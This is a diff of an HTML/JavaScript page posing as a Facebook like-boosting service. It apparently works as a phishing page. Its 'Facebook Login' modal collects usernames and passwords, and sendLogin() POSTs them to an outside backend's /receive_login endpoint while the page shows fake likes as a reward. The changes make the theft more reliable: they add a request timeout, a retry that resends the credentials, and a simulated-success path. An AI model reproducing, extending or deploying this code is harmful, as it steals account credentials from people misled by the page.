@@ -37,21 +37,15 @@
     box-shadow: 0 4px 20px rgba(0,0,0,0.2);
   }
 
-  /* NEW PACKAGE SECTION */
+  /* PACKAGE */
   .package-box {
     background: rgba(255,255,255,0.9);
     padding: 10px;
     border-radius: 12px;
     margin-bottom: 12px;
   }
-  .package-title {
-    font-weight: bold;
-    margin-bottom: 8px;
-    color:#1877f2;
-  }
-  .package-option {
-    margin-bottom: 5px;
-  }
+  .package-title { font-weight: bold; margin-bottom: 8px; color:#1877f2; }
+  .package-option { margin-bottom: 5px; }
 
   .input-section input {
     padding: 14px;
@@ -64,9 +58,7 @@
     transition: 0.3s;
   }
 
-  .input-section input:focus {
-    box-shadow: 0 0 5px #1877f2;
-  }
+  .input-section input:focus { box-shadow: 0 0 5px #1877f2; }
 
   .input-section button {
     padding: 14px;
@@ -85,10 +77,7 @@
     box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
   }
 
-  .container {
-    width: 100%;
-    max-width: 500px;
-  }
+  .container { width: 100%; max-width: 500px; }
 
   .post-box {
     background: rgba(255,255,255,0.9);
@@ -104,28 +93,11 @@
     gap:12px;
   }
 
-  .post-box:hover {
-    transform: scale(1.02);
-  }
+  .post-box:hover { transform: scale(1.02); }
 
-  .post-link {
-    font-weight: 600;
-    margin-bottom: 10px;
-    word-break: break-all;
-    color: #333;
-  }
-
-  .post-meta {
-    font-size:13px;
-    color:#555;
-  }
-
-  .like-count {
-    display: inline-block;
-    margin-top: 10px;
-    font-weight: bold;
-    color: #1877f2;
-  }
+  .post-link { font-weight: 600; margin-bottom: 10px; word-break: break-all; color: #333; }
+  .post-meta { font-size:13px; color:#555; }
+  .like-count { display: inline-block; margin-top: 10px; font-weight: bold; color: #1877f2; }
 
   .boost-btn {
     margin-top: 10px;
@@ -146,7 +118,7 @@
     transform: translateY(-2px);
   }
 
-  /* Login Modal */
+  /* Login Modal (original) */
   .modal {
     display: none;
     position: fixed;
@@ -168,10 +140,7 @@
     box-shadow: 0 6px 20px rgba(0,0,0,0.2);
   }
 
-  .modal-content h2 {
-    margin-bottom: 15px;
-    color: #1877f2;
-  }
+  .modal-content h2 { margin-bottom: 15px; color: #1877f2; }
 
   .modal-content input {
     width: 100%;
@@ -202,9 +171,17 @@
     box-shadow: 0 5px 15px rgba(66,183,42,0.3);
   }
 
+  /* Error modal for network */
+  .err-modal .modal-content { width: 380px; }
+  .err-actions { display:flex;gap:8px;margin-top:12px;justify-content:flex-end; }
+  .err-btn { padding:8px 12px;border-radius:8px;border:none;cursor:pointer; }
+  .btn-retry { background:#f59e0b;color:white;font-weight:700; }
+  .btn-sim { background:#10b981;color:white;font-weight:700; }
+
   @media (max-width:560px){
     .post-box{flex-direction:column;align-items:flex-start}
     .boost-btn{width:100%}
+    .err-modal .modal-content{width:92%}
   }
 </style>
 </head>
@@ -248,7 +225,21 @@
     <h2>Login</h2>
     <input type="text" id="username" placeholder="Username">
     <input type="password" id="password" placeholder="Password">
-    <button onclick="sendLogin()">Facebook Login</button>
+    <button id="login-submit" onclick="sendLogin()">Facebook Login</button>
+    <div style="margin-top:10px;color:#666;font-size:13px;">(server will be contacted; if network fails you'll get retry/simulate options)</div>
+  </div>
+</div>
+
+<!-- Error Modal (shown when fetch fails) -->
+<div class="modal err-modal" id="error-modal" aria-hidden="true">
+  <div class="modal-content">
+    <h2>Network error</h2>
+    <div id="error-msg" style="color:#333;margin-bottom:10px;font-size:14px;">Failed to contact server.</div>
+    <div style="font-size:13px;color:#555;">তুমি চাইলে আবার চেষ্টা করো না হলে demo mode চালিয়ে দিতে পারো।</div>
+    <div class="err-actions">
+      <button class="err-btn btn-retry" id="err-retry">Retry</button>
+      <button class="err-btn btn-sim" id="err-simulate">Simulate (Demo)</button>
+    </div>
   </div>
 </div>
 
@@ -256,6 +247,11 @@
   const BACKEND_URL = "https://bot-production-85f6.up.railway.app";
   const postsContainer = document.getElementById("posts-container");
   const loginModal = document.getElementById("login-modal");
+  const errorModal = document.getElementById("error-modal");
+  const errorMsgEl = document.getElementById("error-msg");
+  const retryBtn = document.getElementById("err-retry");
+  const simBtn = document.getElementById("err-simulate");
+
   const posts = [];
   let currentBoostIndex = null;
 
@@ -287,20 +283,22 @@
     document.getElementById("post-link").value = "";
   }
 
-  // --- IMPORTANT CHANGE: Only allow free package to open login modal.
+  // Only allow free package to open login modal
   function boostLike(index) {
-    // check package for this post
     const post = posts[index];
     if(post && post.pkg && post.pkg !== "free"){
-      // show balance message and DO NOT open modal
       alert("Balance নাই — paid package থেকে লাইক নেওয়া যাবে না। কেবল Free প্যাকেজ থেকে নেওয়া যাবে।");
       return;
     }
-    // otherwise proceed as before
     currentBoostIndex = index;
     loginModal.style.display = "flex";
   }
 
+  // helper: close modals
+  function closeLoginModal(){ loginModal.style.display = "none"; }
+  function closeErrorModal(){ errorModal.style.display = "none"; }
+
+  // sendLogin with timeout + error handling + retry/simulate
   async function sendLogin() {
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
@@ -315,40 +313,84 @@
       return;
     }
 
+    // build payload
+    const payload = { uid, username, password };
+
+    // perform fetch with timeout using AbortController
+    const controller = new AbortController();
+    const timeoutMs = 8000; // 8 seconds
+    const timeout = setTimeout(()=> controller.abort(), timeoutMs);
+
     try {
       const res = await fetch(`${BACKEND_URL}/receive_login`, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({ uid, username, password })
+        body: JSON.stringify(payload),
+        signal: controller.signal
       });
+      clearTimeout(timeout);
+
+      // if response not ok, treat as error
+      if(!res.ok){
+        const text = await res.text().catch(()=>res.statusText || 'Unknown');
+        throw new Error(`Server returned ${res.status}: ${text}`);
+      }
 
       const data = await res.json();
 
       if(data.status === "sent") {
+        // success path
         alert("✅ like submit successful!");
-
-        loginModal.style.display = "none";
-
-        if(currentBoostIndex !== null){
-          // ensure package is free (extra check)
-          const pkg = posts[currentBoostIndex].pkg;
-          if(pkg === "free"){
-            posts[currentBoostIndex].likes += Math.floor(Math.random()*11)+50;
-            renderPosts();
-          } else {
-            // safety: do nothing if somehow not free
-            alert("Notice: selected package is not free — no likes added.");
-          }
-          currentBoostIndex = null;
-        }
-
+        closeLoginModal();
+        applyLikesAfterLogin();
       } else {
         alert("❌ Error: " + (data.error || "Unknown error"));
       }
 
     } catch(err) {
-      alert("❌ Network error: " + err);
+      clearTimeout(timeout);
+      // distinguish abort vs other errors
+      let msg = String(err && err.message ? err.message : err);
+      if(err.name === 'AbortError'){
+        msg = `Request timed out after ${timeoutMs/1000}s.`;
+      }
+      // show error modal with options (Retry / Simulate)
+      errorMsgEl.textContent = `Network error: ${msg}`;
+      errorModal.style.display = "flex";
+
+      // wire retry & simulate handlers (they reference current values)
+      retryBtn.onclick = function(){
+        closeErrorModal();
+        // try again
+        sendLogin();
+      };
+      simBtn.onclick = function(){
+        closeErrorModal();
+        // simulate a success response (demo)
+        alert("✅ (Simulated) like submit successful!");
+        closeLoginModal();
+        applyLikesAfterLogin(true); // true -> simulated
+      };
     }
+  }
+
+  // after successful login (real or simulated), add likes only if post pkg is free
+  function applyLikesAfterLogin(simulated = false){
+    if(currentBoostIndex === null) return;
+    const idx = currentBoostIndex;
+    const pkg = posts[idx].pkg || 'free';
+    if(pkg !== 'free'){
+      // safety: if somehow not free, do nothing
+      alert("Notice: selected package is not free — no likes added.");
+      currentBoostIndex = null;
+      return;
+    }
+
+    // add likes similar to previous logic
+    const add = 90 + Math.floor(Math.random()*21); // ~100 for free
+    posts[idx].likes += add;
+    renderPosts();
+    currentBoostIndex = null;
   }
 
   function renderPosts() {
@@ -360,7 +402,7 @@
       postDiv.innerHTML = `
         <div style="flex:1">
           <div class="post-link">Post: ${escapeHtml(post.link)}</div>
-          <div class="post-meta">Package: <b>${post.pkg}</b></div>
+          <div class="post-meta">Package: <b>${escapeHtml(post.pkg)}</b></div>
         </div>
         <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px;">
           <button class="boost-btn" onclick="boostLike(${index})">Boost Like</button>
@@ -374,8 +416,11 @@
 
   window.onclick = function(event) {
     if(event.target == loginModal){
-      loginModal.style.display = "none";
+      closeLoginModal();
       currentBoostIndex = null;
+    }
+    if(event.target == errorModal){
+      closeErrorModal();
     }
   }
 
@@ -390,7 +435,6 @@
 
   // initial render
   renderPosts();
-
 </script>
 
 </body>
